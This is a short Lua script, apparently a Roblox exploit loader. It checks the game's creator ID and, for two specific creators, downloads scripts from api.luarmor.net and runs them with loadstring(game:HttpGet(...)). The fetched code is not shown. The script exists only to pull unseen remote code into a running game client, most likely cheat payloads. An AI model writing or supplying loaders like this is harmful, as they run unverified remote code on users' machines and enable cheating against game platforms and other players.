repeat wait() until game:IsLoaded()
local creator_id = game.CreatorId;

if (creator_id == 14032806) then
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d2dfa4cebd0410e773e815204a8edbe4.lua", true))()
elseif (creator_id == 1154360 and game.PlaceId ~= 10228136016) then
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bfee51375d5fb9484aff5f92dac805a5.lua", true))()
end
